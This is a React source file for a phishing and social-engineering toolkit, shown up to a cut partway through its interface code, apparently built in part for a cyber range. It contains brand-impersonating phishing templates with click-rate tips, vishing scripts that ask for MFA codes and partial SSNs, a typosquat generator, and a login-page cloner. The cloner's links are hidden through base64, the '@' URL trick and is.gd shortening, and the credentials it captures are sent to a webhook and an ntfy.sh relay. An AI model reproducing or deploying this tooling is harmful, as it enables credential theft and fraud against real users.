import React, { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import {
    Users, Mail, UserCheck, GraduationCap, Fish,
    ShieldAlert, Usb, Phone, CheckCircle, XCircle,
    AlertTriangle, Send, Search, Terminal, Globe,
    ExternalLink, Copy, Eye, Save, Plus, Trash2,
    FileText, UserPlus, Zap, MessageSquare, Monitor,
    Shield, Briefcase, CreditCard, Layout, Smartphone,
    Clock, MoreVertical, Paperclip, Smile, Camera, Mic,
    RefreshCw, Fingerprint, Share2, Facebook, CheckCheck, ArrowLeft, Battery, Wifi, Signal
} from 'lucide-react';
import { useToast } from '../../context/ToastContext';
import { CLONE_MOCKUPS } from '../../data/social-mockups';
import { cyberRangeBus, RANGE_EVENTS } from '../../utils/cyberRangeBus';

// --- CONSTANTS & DATA ---
const PHISHING_TEMPLATES = [
    {
        id: 'o365',
        name: 'Microsoft Office 365',
        category: 'Corporate',
        subject: 'Action Required: Security Update for {{target_name}}',
        sender: 'security@office365-verify.com',
        content: `Dear {{target_name}},\n\nOur systems have detected an unusual login attempt on your account from an unrecognized device in Lisbon, Portugal.\n\nTo ensure your data remains secure, please review your recent activity and confirm your identity.\n\n[Verify Account Now]\n\nIf you do not complete this verification within 4 hours, your access to Outlook, Teams, and OneDrive will be restricted.\n\nThank you,\nThe Microsoft Security Team`,
        tips: 'Use this with a homograph domain like 0ffice365-verify.com'
    },
    {
        id: 'linkedin',
        name: 'LinkedIn Connection',
        category: 'Social',
        subject: '{{sender_name}} wants to connect on LinkedIn',
        sender: 'notifications@linkedin-mail.net',
        content: `Hi {{target_name}},\n\nI saw your profile on the {{industry}} group and was impressed by your work at {{company}}.\n\nI'd love to connect and chat about potential collaboration on some upcoming projects in the {{location}} area.\n\nView {{sender_name}}'s profile: http://linkedin-view.com/p/{{sender_id}}\n\nBest,\n{{sender_name}}`,
        tips: 'High success rate for recruitment-themed pretexts.'
    },
    {
        id: 'google_alert',
        name: 'Google Security Alert',
        category: 'Corporate',
        subject: 'Security alert for {{target_email}}',
        sender: 'no-reply@accounts.google-security.net',
        content: `A new sign-in on Windows\n\n{{target_email}}\nYour Google Account was just signed in to from a new Windows device. You're getting this email to make sure that it was you.\n\n[Check Activity]\n\nIf you don't recognize this activity, your account might be at risk.`,
        tips: 'Very effective when sent late at night/early morning.'
    },
    {
        id: 'apple_id',
        name: 'Apple ID: Unusual Sign-In',
        category: 'Consumer',
        subject: 'Your Apple ID was used to sign in to iCloud on a MacBook Pro 13"',
        sender: 'noreply@appleid.apple-support.com',
        content: `Dear {{target_name}},\n\nYour Apple ID ({{target_email}}) was used to sign in to iCloud via a web browser.\n\nDate and Time: {{date}}\nIP Address: 192.168.1.1 (Moscow, RU)\n\nIf you did not sign in to iCloud recently and believe someone may have accessed your account, you should reset your password at Apple ID (https://appleid.apple-verify.cc).`,
        tips: 'Classic "Security Panic" template. Works well on mobile users.'
    },
    {
        id: 'banking_fraud',
        name: 'Bank: Suspicious Transaction',
        category: 'Banking',
        subject: 'Urgent: Fraud Protection Alert - Transaction ID #{{txn_id}}',
        sender: 'fraud-alert@{{bank_name}}.com',
        content: `Hello {{target_name}},\n\nWe noticed a transaction that doesn't fit your spending pattern. \n\nMerchant: BITCOIN_EX_LTD\nAmount: $2,499.00\nLocation: London, UK\n\nIf you did NOT authorize this transaction, please click below to secure your account immediately.\n\n[Secure My Account]`,
        tips: 'Urgency + Financial Loss = High Click-through rate.'
    },
    {
        id: 'vpn_update',
        name: 'VPN: Configuration Change',
        category: 'IT/Security',
        subject: 'Mandatory Global VPN Migration for {{company}} Employees',
        sender: 'it-noreply@{{company_domain}}',
        content: `Hi {{target_name}},\n\nWe are moving to a new encrypted tunnel protocol. To ensure zero downtime, please update your VPN client configuration by downloading the new profile from the internal portal.\n\nPortal: http://vpn-portal.{{company_domain}}/config/download\n\nFailure to update will result in loss of remote access by midnight.`,
        tips: 'Great for targeting remote workers or DevOps teams.'
    },
    {
        id: 'hr_bonus',
        name: 'HR: Performance Bonus',
        category: 'Social/Work',
        subject: 'Confidential: FY24 Quarter 3 Bonus Allocation for {{target_name}}',
        sender: 'hr-payroll@{{company_domain}}',
        content: `Dear {{target_name}},\n\nWe are pleased to inform you that you have been selected for a performance-based bonus this quarter.\n\nPlease review your allocation details and sign the acknowledgement form in the employee portal to process your payment.\n\n[View Bonus Allocation]\n\nCongratulations,\nHR Payroll Team`,
        tips: 'Exploits "Reward Curiosity". Extremely high success rate.'
    },
    {
        id: 'slack_mention',
        name: 'Slack: New Mention',
        category: 'Communication',
        subject: '{{sender_name}} mentioned you in #confidential-project',
        sender: 'feedback@slack-mail.net',
        content: `{{sender_name}}:\n"@{{target_username}} can you take a quick look at these credentials for the staging server? I think they're wrong: http://slack-files.com/T024/{{file_id}}"\n\n[Reply in Slack]`,
        tips: 'Effective for targeting developers and technical staff.'
    },
    {
        id: 'amazon_refund',
        name: 'Amazon: Refund Confirmation',
        category: 'Consumer/Shopping',
        subject: 'Confirmation: Your refund for Order #{{txn_id}} has been processed',
        sender: 'payments-confirm@amazon-refunds.com',
        content: `Hi {{target_name}},\n\nWe have successfully processed your refund of $142.99 for the returned item from Order #{{txn_id}}.\n\nThe funds should appear in your account within 3-5 business days.\n\n[View Refund Details]\n\nIf you did not request a refund, please contact our dispute department immediately at security-amazon.cc.`,
        tips: 'Reverse psychology. The user clicks because they "didn\'t" request it.'
    },
    {
        id: 'netflix_billing',
        name: 'Netflix: Payment Declined',
        category: 'Consumer/Entertainment',
        subject: 'Update Required: Your Netflix subscription has been paused',
        sender: 'billing@netflix-account.io',
        content: `Your subscription is on hold.\n\nWe're having some trouble with your current billing information. We'll try again, but in the meantime, you may want to update your payment details to keep watching.\n\n[Update Payment Method]\n\nNeed help? We're here if you need it. Visit the Help Center or contact us now.`,
        tips: 'Extremely effective for personal email targets.'
    },
    {
        id: 'paypal_dispute',
        name: 'PayPal: Open Dispute',
        category: 'Banking/Finance',
        subject: 'Notification: A dispute has been opened regarding your recent transaction',
        sender: 'service@paypal-security.net',
        content: `Dear {{target_name}},\n\nA buyer has opened a dispute regarding the transaction #{{txn_id}}.\n\nReason: "Item not as described".\n\nTo avoid an automatic deduction from your balance, please provide the shipping tracking information or respond to the dispute within 24 hours.\n\n[Go to Resolution Center]`,
        tips: 'High urgency for sellers and freelancers.'
    },
    {
        id: 'zoom_meeting',
        name: 'Zoom: Meeting Invitation',
        category: 'Communication/Work',
        subject: 'Urgent: CEO is inviting you to a Zoom meeting',
        sender: 'no-reply@zoom-apps.us',
        content: `Hi {{target_name}},\n\nYou've been invited to a private meeting with the Executive Team.\n\nTopic: FY25 Q1 Strategy & Restructuring\nTime: {{date}} (In 10 minutes)\n\nJoin Meeting: https://zoom-us.cloud/j/{{file_id}}\n\nPlease ensure your camera is active.`,
        tips: 'The "Restructuring" keyword creates high anxiety and clicks.'
    }
];

const PRETEXT_PRESETS = [
    {
        id: 'it_help',
        title: 'IT Helpdesk Support',
        context: 'Phone / Vishing',
        scenario: 'A random IT tech calling to "fix" a slow workstation.',
        script: `[Caller]: Hi {{target_name}}, this is {{attacker_alias}} from the IT Helpdesk. We're seeing some weird latency spikes coming from your workstation ID {{workstation_id}}.\n\n[Target]: Oh, really?\n\n[Caller]: Yeah, we're trying to push a remote fix so you don't lose work, but the authentication token is timing out on our end. We just need you to verify the code sent to your mobile or read back the current session ID...`
    },
    {
        id: 'hr_survey',
        title: 'HR Benefits Survey',
        context: 'Email / Survey',
        scenario: 'Collecting PII under the guise of an employee satisfaction survey.',
        script: `Hello {{target_name}},\n\nAs part of our commitment to improving employee wellness at {{company}}, we've partnered with 'ZenMetrics' to conduct an anonymous benefits audit.\n\nTo ensure your specific medical and retirement preferences are accounted for in the 2024 budget, please complete the profile at the link below.\n\nYou will need your Employee ID and the last 4 digits of your SSN to log in.`
    }
];


// --- CONSTANTS & DATA ---

const SocialEngineeringPro = () => {
    const { toast } = useToast();
    const [activeTab, setActiveTab] = useState('phishing');
    const [dossier, setDossier] = useState(() => JSON.parse(localStorage.getItem('se_dossier')) || []);
    const [targetInfo, setTargetInfo] = useState({
        name: 'John Doe',
        company: 'Acme Corp',
        role: 'DevOps Engineer',
        location: 'London',
        email: 'j.doe@acme-corp.com',
        username: 'jdoe88'
    });

    // --- TYPOSQUAT V2 ---
    const [typoDomain, setTypoDomain] = useState('google.com');
    const [typoResults, setTypoResults] = useState([]);

    // --- CHAT STUDIO ---
    const [chatPlatform, setChatPlatform] = useState('whatsapp');
    const [chatTarget, setChatTarget] = useState('Sarah Jenkins');
    const [chatMessages, setChatMessages] = useState([
        { id: 1, sender: 'target', text: 'Hey, did you get those login details?', time: '10:42 AM' },
        { id: 2, sender: 'me', text: 'Not yet, which ones?', time: '10:43 AM' },
        { id: 3, sender: 'target', text: 'The ones for the new staging server. HR sent them earlier.', time: '10:45 AM' }
    ]);
    const [newMessage, setNewMessage] = useState('');

    // --- WEB CLONER V2 ---
    const [clonerUrl, setClonerUrl] = useState('https://login.microsoftonline.com');
    const [clonerStatus, setClonerStatus] = useState('IDLE'); // IDLE, SCANNING, CLONING, READY
    const [clonerLogs, setClonerLogs] = useState([]);
    const [showPreview, setShowPreview] = useState(false);
    const [isDeployed, setIsDeployed] = useState(false);
    const [clonerDeployedUrl, setClonerDeployedUrl] = useState('');
    const [clonerPlatform, setClonerPlatform] = useState('generic');
    const [webhookUrl, setWebhookUrl] = useState(() => localStorage.getItem('se_webhook') || '');
    const [proxyUrl, setProxyUrl] = useState(() => localStorage.getItem('se_proxy') || '');
    const [harvestedData, setHarvestedData] = useState([
        { id: 1, time: '2 mins ago', domain: 'office365-login.cc', type: 'Credential', data: 'j.doe@corp.com : P@ssword123', device: 'Desktop (Chrome)', location: 'London, UK' },
        { id: 2, time: '15 mins ago', domain: 'vpn-portal.top', type: 'Session Cookie', data: 'session_id=kz92j... (Captured)', device: 'Mobile (Safari)', location: 'New York, US' }
    ]);
    const [relayId, setRelayId] = useState(() => {
        let id = localStorage.getItem('se_relay_id');
        if (!id) {
            // Use a more unique and standard topic name for ntfy.sh
            id = 'shub_relay_' + Math.random().toString(36).substring(2, 15);
            localStorage.setItem('se_relay_id', id);
        }
        return id;
    });

    // Data Harvesting State
    const [captureInputs, setCaptureInputs] = useState({ user: '', pass: '' });

    // Campaign Platform
    const [campaignPlatform, setCampaignPlatform] = useState('whatsapp');
    const [customCampaignMessage, setCustomCampaignMessage] = useState('');
    const [customBaseUrl, setCustomBaseUrl] = useState('');
    const [isStealthLoading, setIsStealthLoading] = useState(false);
    const [stealthAlias, setStealthAlias] = useState('');
    const [useAuthorityMask, setUseAuthorityMask] = useState(true);

    // Phishing State
    const [selectedTemplate, setSelectedTemplate] = useState(PHISHING_TEMPLATES[0]);

    useEffect(() => {
        localStorage.setItem('se_dossier', JSON.stringify(dossier));
    }, [dossier]);

    useEffect(() => {
        localStorage.setItem('se_webhook', webhookUrl);
        localStorage.setItem('se_proxy', proxyUrl);
    }, [webhookUrl, proxyUrl]);

    // --- DATA RELAY POLLING (NTFY.SH) ---
    useEffect(() => {
        if (!isDeployed) return;

        const pollRelay = async () => {
            try {
                // Use since=all to get historical messages for the current session, or a timestamp
                const response = await fetch(`https://ntfy.sh/${relayId}/json?poll=1&since=all`);
                if (response.ok) {
                    const text = await response.text();
                    const lines = text.trim().split('\n');

                    lines.forEach(line => {
                        try {
                            const ntfyMsg = JSON.parse(line);
                            // ntfy.sh sends different event types, we only care about 'message'
                            if (ntfyMsg.event === 'message' && ntfyMsg.message) {
                                let capture;
                                try {
                                    capture = JSON.parse(ntfyMsg.message);
                                } catch (e) {
                                    // If message is not JSON, it might be a raw string from previous versions
                                    return;
                                }

                                if (capture && capture.id) {
                                    setHarvestedData(prev => {
                                        const exists = prev.some(c => c.id === capture.id);
                                        if (!exists) {
                                            toast(`New Intel Captured from ${capture.platform}!`, 'primary');
                                            return [capture, ...prev];
                                        }
                                        return prev;
                                    });
                                }
                            }
                        } catch (e) { /* skip malformed */ }
                    });
                }
            } catch (err) {
                console.error("Relay poll failed:", err);
            }
        };

        const interval = setInterval(pollRelay, 4000);
        return () => clearInterval(interval);
    }, [isDeployed, relayId]);

    // --- LOGIC ---
    const generateTyposV2 = () => {
        const [domain, tld] = typoDomain.split('.');
        if (!domain || !tld) return toast('Invalid domain format', 'error');

        const results = [];

        // 1. Homoglyphs (Punycode style)
        results.push({ type: 'Homoglyph', domain: domain.replace('o', '0') + '.' + tld, risk: 'High' });
        results.push({ type: 'Homoglyph', domain: domain.replace('l', '1') + '.' + tld, risk: 'High' });

        // 2. Bitsquatting (Single bit flip)
        results.push({ type: 'Bitsquat', domain: domain.slice(0, -1) + String.fromCharCode(domain.charCodeAt(domain.length - 1) + 1) + '.' + tld, risk: 'Medium' });

        // 3. Combosquatting
        results.push({ type: 'Combo', domain: `login-${domain}.${tld}`, risk: 'Extreme' });
        results.push({ type: 'Combo', domain: `${domain}-secure.${tld}`, risk: 'High' });
        results.push({ type: 'Combo', domain: `${domain}-support.${tld}`, risk: 'High' });

        // 4. TLD Rotation
        results.push({ type: 'TLD', domain: `${domain}.net`, risk: 'Low' });
        results.push({ type: 'TLD', domain: `${domain}.top`, risk: 'High' });
        results.push({ type: 'TLD', domain: `${domain}.cc`, risk: 'Medium' });

        setTypoResults(results);
        toast('Advanced Typosquats Generated', 'success');
    };

    const addChatMessage = (side) => {
        if (!newMessage.trim()) return;
        const msg = {
            id: Date.now(),
            sender: side,
            text: newMessage,
            time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
        };
        setChatMessages([...chatMessages, msg]);
        setNewMessage('');
    };

    const runCloner = async () => {
        if (!clonerUrl) return toast('Please enter a target URL', 'error');

        setClonerStatus('SCANNING');
        setClonerLogs(['[INIT] Initializing Neural Cloner v2.0...', '> Target: ' + clonerUrl]);

        // Auto-detect platform
        const u = clonerUrl.toLowerCase();
        let detected = 'generic';
        if (u.includes('microsoft') || u.includes('outlook') || u.includes('office')) detected = 'microsoft';
        else if (u.includes('google') || u.includes('gmail')) detected = 'google';
        else if (u.includes('facebook') || u.includes('fb.')) detected = 'facebook';
        else if (u.includes('instagram')) detected = 'instagram';
        else if (u.includes('discord')) detected = 'discord';
        else if (u.includes('github')) detected = 'github';
        else if (u.includes('paypal')) detected = 'paypal';
        else if (u.includes('netflix')) detected = 'netflix';
        else if (u.includes('shahid')) detected = 'shahid';
        else if (u.includes('watchit')) detected = 'watchit';
        else if (u.includes('yango')) detected = 'yangoplay';
        else if (u.includes('spotify')) detected = 'spotify';
        else if (u.includes('anghami')) detected = 'anghami';
        else if (u.includes('deezer')) detected = 'deezer';
        else if (u.includes('x.com') || u.includes('twitter')) detected = 'x';
        else if (u.includes('linkedin')) detected = 'linkedin';

        setClonerPlatform(detected);

        const stages = [
            { msg: '[AUTH] Verified Operator Credentials...', delay: 600 },
            { msg: '[HINT] Tip: Add a custom typosquatted domain in config for 500% more realism.', delay: 200 },
            { msg: '[SCAN] Identifying target framework...', delay: 800 },
            { msg: '[SCAN] Detected: React / Node.js Backend', delay: 1000 },
            { msg: '[EXFIL] Fetching static assets (CSS, JS, Fonts)...', delay: 1200 },
            { msg: '[MAP] Mapping form actions and CSRF tokens...', delay: 900 },
            { msg: '[INJECT] Patching auth-handler for credential capture...', delay: 1500 },
            { msg: '[OBFUSCATE] Applying polymorphic script masking...', delay: 1100 },
            { msg: '[DEPLOY] Registering intercept node on edge-network...', delay: 1300 }
        ];

        for (const stage of stages) {
            await new Promise(r => setTimeout(r, stage.delay));
            setClonerLogs(prev => [...prev, stage.msg]);
            if (stage.msg.includes('Patching')) setClonerStatus('CLONING');
        }

        setClonerStatus('READY');
        toast('Website Cloned & Logic Injected', 'success');
    };

    const handleDeploy = () => {
        setIsDeployed(true);
        // Prioritize custom base URL if provided, otherwise use window origin
        const base = customBaseUrl ? customBaseUrl.replace(/\/$/, '') : window.location.origin;
        const platform = clonerPlatform;
        const target = clonerUrl;
        const rId = relayId;

        // Base64 Obfuscation for URL parameters
        const params = `p=${platform}&url=${encodeURIComponent(target)}&r=${rId}`;
        const encodedParams = btoa(params);

        const generatedUrl = `${base}/l/auth?e=${encodedParams}`;

        setClonerDeployedUrl(generatedUrl);
        setClonerStatus('READY');
        setClonerLogs(prev => [...prev, `[SUCCESS] Deployment Live (Obfuscated): ${generatedUrl}`]);
        toast('Phishing Instance Deployed', 'success');

        // --- CYBER RANGE EVENT BUS ---
        cyberRangeBus.emit(RANGE_EVENTS.ATTACK_STARTED, {
            source: 'SocialEngineeringPro',
            attackType: 'Phishing Campaign',
            platform: clonerPlatform,
            targetUrl: clonerUrl,
            campaignUrl: generatedUrl,
            mitreId: 'T1566.002' // Spearphishing Link
        });
        // ----------------------------
    };

    const handleStealthDeploy = async () => {
        setIsStealthLoading(true);
        setClonerLogs(prev => [...prev, `[STEALTH] Initializing Zero-Config Stealth Engine...`]);

        try {
            // 1. Generate the base obfuscated URL
            const base = customBaseUrl ? customBaseUrl.replace(/\/$/, '') : window.location.origin;
            const params = `p=${clonerPlatform}&url=${encodeURIComponent(clonerUrl)}&r=${relayId}`;
            const encodedParams = btoa(params);
            const originalUrl = `${base}/l/auth?e=${encodedParams}`;

            // 2. Apply Authority Masking (@ Trick)
            // We use the hostname of the target URL as the mask
            const targetHostname = new URL(clonerUrl).hostname;
            const finalOriginalUrl = useAuthorityMask
                ? `https://${targetHostname}@${originalUrl.replace(/^https?:\/\//, '')}`
                : originalUrl;

            setClonerLogs(prev => [...prev, `[STEALTH] Applied Authority Masking: ${useAuthorityMask ? targetHostname : 'OFF'}`]);

            // 3. Shorten via is.gd API (CORS friendly and no key required)
            let alias = stealthAlias;
            const domainPrefix = targetHostname.split('.')[0];

            const tryShorten = async (targetAlias) => {
                const aliasParam = targetAlias ? `&shorturl=${encodeURIComponent(targetAlias)}` : '';
                const response = await fetch(`https://is.gd/create.php?format=json&url=${encodeURIComponent(finalOriginalUrl)}${aliasParam}`);
                return await response.json();
            };

            let data = await tryShorten(alias);

            // Error 4: Alias already taken or invalid
            if (!data.shorturl && alias) {
                setClonerLogs(prev => [...prev, `[WARN] Alias "${alias}" unavailable. Retrying with random...`]);
                data = await tryShorten(null); // Try without alias
            }

            if (data.shorturl) {
                setClonerDeployedUrl(data.shorturl);
                setClonerLogs(prev => [...prev, `[SUCCESS] Stealth Link Generated: ${data.shorturl}`]);
                toast('Stealth Link Active!', 'success');
            } else {
                throw new Error(data.errormessage || 'Shortening failed');
            }
        } catch (err) {
            console.error("Stealth deployment failed:", err);
            setClonerLogs(prev => [...prev, `[ERROR] Stealth Engine failure: ${err.message}`]);
            toast(`Stealth Mode Failed: ${err.message}`, 'error');
            handleDeploy(); // Fallback to normal deploy
        } finally {
            setIsStealthLoading(false);
        }
    };

    const handleHarvest = (type, value) => {
        setCaptureInputs(prev => ({ ...prev, [type]: value }));
    };

    const parseDeviceInfo = () => {
        const ua = navigator.userAgent;
        let device = "Desktop PC";
        if (/android/i.test(ua)) device = "Android Mobile";
        else if (/iphone|ipad|ipod/i.test(ua)) device = "iOS Device";
        else if (/macintosh/i.test(ua)) device = "macOS Workstation";

        let browser = "vBrowser";
        if (ua.includes("Chrome")) browser = "Chrome";
        else if (ua.includes("Firefox")) browser = "Firefox";
        else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
        else if (ua.includes("Edg")) browser = "Edge";

        return { device, browser, os: navigator.platform };
    };

    const getProfessionalPretext = (platform, url, transport = 'general') => {
        const platformName = platform.charAt(0).toUpperCase() + platform.slice(1);
        const domain = url ? new URL(url).hostname : 'secure-portal.local';

        // --- High-Fidelity Masking Logic ---
        let displayUrl = clonerDeployedUrl || '---';
        if (clonerDeployedUrl && url) {
            try {
                const targetHostname = new URL(url).hostname;
                // If it's already a masked URL, don't double-mask
                if (!displayUrl.includes('@')) {
                    displayUrl = `https://${targetHostname}@${clonerDeployedUrl.replace(/^https?:\/\//, '')}`;
                }
            } catch (e) {
                console.error("Masking failed in pretext", e);
            }
        }

        // --- Transport-Specific Header Injection (Spoofing) ---
        // --- Transport-Specific Header Injection (Visual Spoofing) ---
        let header = '';
        if (transport === 'sms') {
            // SMS: FWD Style (implies automated system relay)
            const shortcode = Math.floor(Math.random() * 89999 + 10000);
            header = `[FWD: ${platformName} Auth]\nCMD-ID: ${shortcode}\nMSG: Security Alert\n\n`;
        } else if (transport === 'email') {
            // Email: Standard "Forwarded" block to explain personal sender
            header = `---------- Forwarded message ---------\nFrom: ${platformName} Security <security@${platform}-auth-team.com>\nDate: ${new Date().toUTCString()}\nSubject: Critical Security Notification\nTo: <${targetInfo.email || 'user@target.com'}>\n\n`;
        }

        const templates = {
            whatsapp: `⚠️ [Security Alert] Unusual login detected for your ${platformName} account from London, UK. If this wasn't you, please secure your account immediately: ${displayUrl}`,
            messenger: `🛡️ [Meta Security] We've detected a sign-in attempt from an unrecognized browser. Please verify your identity to prevent account suspension: ${displayUrl}`,
            sms: `Final Notice: Your session on ${domain} is about to expire due to a security update. Re-authenticate now to avoid service interruption: ${displayUrl}`,
            email: `Action Required: Your ${platformName} organization policy requires a mandatory security audit. Please complete the verification process to maintain your active status.\n\nVerify Here: ${displayUrl}`,
            microsoft: `[Microsoft Security] A security challenge was issued for your tenant account. Please sign in to verify your identity and resolve the alert: ${displayUrl}`,
            google: `[Google Account] Suspicious activity detected. Someone from 'Moscow, RU' just used your password to try to sign into your account. Check activity: ${displayUrl}`,
            facebook: `[Facebook] We've temporarily locked your account because we detected suspicious activity. Please verify your identity to unlock it: ${displayUrl}`,
            netflix: `[Netflix] Your membership is currently on hold. We're having some trouble with your current billing information. Update payment here: ${displayUrl}`,
            generic: `🔒 [Secure Login] High-priority security patch available for your workstation. Authenticate to ${domain} to begin installation: ${displayUrl}`
        };

        return header + (templates[platform] || templates.generic);
    };

    // --- NEW STATE FOR QR BRIDGE ---
    const [showQRModal, setShowQRModal] = useState(false);
    const [qrData, setQrData] = useState({ url: '', title: '' });

    const handleSocialShare = (platform) => {
        // Pass the explicit transport type to get the spoofed header
        const message = customCampaignMessage || getProfessionalPretext(campaignPlatform, clonerUrl, platform);
        const encodedMsg = encodeURIComponent(message);
        let url = "";

        // Detect if Mobile Device
        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);

        switch (platform) {
            case 'whatsapp': url = `https://wa.me/?text=${encodedMsg}`; break;
            case 'messenger': url = `fb-messenger://share/?link=${encodeURIComponent(clonerDeployedUrl)}`; break;
            case 'email': url = `mailto:?subject=Critical Security Alert&body=${encodedMsg}`; break;
            case 'sms':
                url = `sms:?&body=${encodedMsg}`;
                // If Desktop, Trigger QR Bridge
                if (!isMobile) {
                    setQrData({
                        url: url,
                        title: 'SCAN TO SEND SMS via MOBILE'
                    });
                    setShowQRModal(true);
                    return;
                }
                break;
            case 'telegram': url = `https://t.me/share/url?url=${encodeURIComponent(clonerDeployedUrl)}&text=${encodedMsg}`; break;
            case 'twitter': url = `https://twitter.com/intent/tweet?text=${encodedMsg}`; break;
            case 'linkedin': url = `https://www.linkedin.com/sharing/share-offsite/?url=${encodeURIComponent(clonerDeployedUrl)}`; break;
            default: copyToClipboard(message); return;
        }

        window.open(url, '_blank');
        setClonerLogs(prev => [...prev, `[CAMPAIGN] External redirect triggered for ${platform}.`]);
    };

    const finalizeHarvest = async () => {
        if (!captureInputs.user && !captureInputs.pass) return;

        const info = parseDeviceInfo();
        const fakeIP = `192.168.1.${Math.floor(Math.random() * 254) + 1}`;

        const newData = {
            id: Date.now(),
            time: new Date().toLocaleTimeString(),
            domain: new URL(clonerUrl).hostname,
            type: 'CREDENTIAL',
            data: `${captureInputs.user || 'N/A'} : ${captureInputs.pass || '******'}`,
            device: `${info.device} (${info.browser})`,
            ip: fakeIP,
            userAgent: navigator.userAgent
        };

        setHarvestedData([newData, ...harvestedData]);
        setCaptureInputs({ user: '', pass: '' });
        toast('New Credentials Captured!', 'success');

        setClonerLogs(prev => [...prev, `[INTERCEPT] Credential exfiltration from ${newData.domain}: ${newData.data}`]);

        // --- CYBER RANGE EVENT BUS ---
        cyberRangeBus.emit(RANGE_EVENTS.CREDENTIAL_CAPTURED, {
            source: 'SocialEngineeringPro',
            username: captureInputs.user,
            password: captureInputs.pass,
            domain: newData.domain,
            ip: newData.ip,
            device: newData.device
        });

        // Real-world Webhook Exfiltration
        if (webhookUrl) {
            try {
                setClonerLogs(prev => [...prev, `[RELAY] Pushing intel to Global Webhook...`]);
                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `🚨 **New Intel Captured via Operative Node**\n**Target:** ${newData.domain}\n**Creds:** \`${newData.data}\`\n**Device:** ${newData.device}\n**IP:** ${newData.ip}\n**Timestamp:** ${newData.time}`,
                        embeds: [{
                            title: "Credential Exfiltration Report",
                            color: 10181046,
                            fields: [
                                { name: "User/Email", value: captureInputs.user || "N/A", inline: true },
                                { name: "Password", value: captureInputs.pass || "******", inline: true },
                                { name: "Hardware", value: info.device, inline: false }
                            ]
                        }]
                    })
                });
                setClonerLogs(prev => [...prev, `[SUCCESS] Intel synced to global listener.`]);
            } catch (err) {
                setClonerLogs(prev => [...prev, `[ERROR] Webhook Relay failed: ${err.message}`]);
            }
        }
    };

    const addToDossier = () => {
        const id = Date.now();
        setDossier([{ id, ...targetInfo, date: new Date().toLocaleDateString() }, ...dossier]);
        toast('Target Added to Dossier', 'success');
    };

    const renderTemplateContent = (content) => {
        return content
            .replace(/{{target_name}}/g, targetInfo.name)
            .replace(/{{target_email}}/g, targetInfo.email)
            .replace(/{{target_username}}/g, targetInfo.username)
            .replace(/{{company}}/g, targetInfo.company)
            .replace(/{{industry}}/g, 'Tech')
            .replace(/{{location}}/g, targetInfo.location)
            .replace(/{{sender_name}}/g, chatTarget)
            .replace(/{{date}}/g, new Date().toLocaleString())
            .replace(/{{txn_id}}/g, Math.floor(Math.random() * 900000 + 100000))
            .replace(/{{file_id}}/g, 'F' + Math.floor(Math.random() * 9000))
            .replace(/{{bank_name}}/g, 'GlobalBank')
            .replace(/{{workstation_id}}/g, 'WK-' + Math.floor(Math.random() * 9000))
            .replace(/{{company_domain}}/g, targetInfo.company.toLowerCase().replace(/ /g, '') + '.com');
    };

    const copyToClipboard = (text) => {
        navigator.clipboard.writeText(text);
        toast('Copied to Clipboard', 'success');
    };

    // --- UI HELPERS ---
    const SectionHeader = ({ icon: Icon, title, desc }) => (
        <div className="mb-8">
            <h2 className="text-2xl font-black italic tracking-tighter flex items-center gap-3 text-purple-400">
                <Icon size={28} /> {title}
            </h2>
            <p className="text-white/40 text-sm font-mono uppercase tracking-widest">{desc}</p>
        </div>
    );

    return (
        <div className="min-h-screen bg-[#0a0a0f] text-slate-300 p-4 md:p-6 font-mono relative overflow-hidden">
            {/* Cyberpunk Grid Background */}
            <div className="fixed inset-0 pointer-events-none opacity-10">
                <div className="absolute inset-0" style={{ backgroundImage: 'radial-gradient(circle, #4c1d95 1px, transparent 1px)', backgroundSize: '40px 40px' }} />
                <div className="absolute top-0 left-1/4 w-px h-full bg-purple-500/20" />
                <div className="absolute top-0 right-1/4 w-px h-full bg-blue-500/20" />
            </div>

            <div className="max-w-7xl mx-auto relative z-10">
                {/* Header */}
                <header className="flex flex-col xl:flex-row justify-between items-start xl:items-center gap-6 mb-12 pb-6 border-b border-white/10">
                    <div>
                        <div className="flex items-center gap-3 text-xs font-black text-purple-500 mb-2 uppercase tracking-[0.4em]">
                            <Zap size={14} className="animate-pulse" /> Neural Operative Interface v5.0
                        </div>
                        <h1 className="text-4xl md:text-5xl font-black italic tracking-tighter text-white">
                            SOCIAL ENGINEERING <span className="text-purple-500">ULTRA</span>
                        </h1>
                    </div>

                    {/* Navigation Tabs */}
                    <div className="flex flex-wrap bg-white/5 p-1 rounded-xl border border-white/10 shadow-2xl">
                        {[
                            { id: 'phishing', label: 'Phishing', icon: Mail },
                            { id: 'chat', label: 'Chat Studio', icon: MessageSquare },
                            { id: 'cloner', label: 'Web Cloner', icon: Monitor },
                            { id: 'typo', label: 'Typosquat Pro', icon: Globe },
                            { id: 'dossier', label: 'Dossier', icon: UserCheck }
                        ].map(tab => (
                            <button
                                key={tab.id}
                                onClick={() => setActiveTab(tab.id)}
                                className={`flex items-center gap-2 px-3 py-2 rounded-lg transition-all text-[11px] font-black uppercase tracking-tighter ${activeTab === tab.id ? 'bg-purple-600 text-white shadow-lg shadow-purple-900/40' : 'text-white/40 hover:text-white hover:bg-white/5'}`}
                            >
                                <tab.icon size={14} /> {tab.label}
                            </button>
                        ))}
                    </div>
                </header>

                <main className="grid grid-cols-1 lg:grid-cols-4 gap-8">
                    {/* LEFT SIDEBAR: Target Profile */}
                    <aside className="lg:col-span-1 space-y-6">
                        <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="bg-white/5 border border-white/10 rounded-2xl p-6 backdrop-blur-xl shadow-2xl shadow-black/50">
                            <h3 className="text-white font-black text-xs uppercase tracking-widest mb-6 flex items-center gap-2 border-b border-white/5 pb-2">
                                <Search size={14} className="text-purple-400" /> Active Profile
                            </h3>
                            <div className="space-y-4">
                                {[
                                    { label: 'Full Name', key: 'name' },
                                    { label: 'Email', key: 'email' },
                                    { label: 'Username', key: 'username' },
                                    { label: 'Company', key: 'company' },
                                    { label: 'Job Role', key: 'role' },
                                    { label: 'Location', key: 'location' }
                                ].map(field => (
                                    <div key={field.key} className="space-y-1">
                                        <label className="text-[9px] text-white/30 uppercase font-bold">{field.label}</label>
                                        <input
                                            type="text"
                                            value={targetInfo[field.key]}
